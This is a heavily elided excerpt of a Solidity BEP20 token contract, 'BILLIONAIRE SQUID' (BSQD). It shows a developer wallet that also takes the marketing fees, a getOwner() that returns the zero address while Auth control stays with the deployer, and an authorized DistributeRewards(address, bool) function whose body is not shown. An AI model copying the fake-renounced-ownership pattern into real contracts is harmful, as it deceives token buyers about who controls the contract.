...
/* Token contract */
contract BillionaireSquid is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    address DEV = 0x4990B83ccBa1a6727889A30b2940F2d0148a1b45; 
    ...
    // Name and symbol
    string constant _name = "BILLIONAIRE SQUID";
    string constant _symbol = "BSQD";
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0x4990B83ccBa1a6727889A30b2940F2d0148a1b45;  
    ...
    function getOwner() external view override returns (address) { return ZERO; } 
    ...
    function DistributeRewards(address _address, bool _value) public authorized{
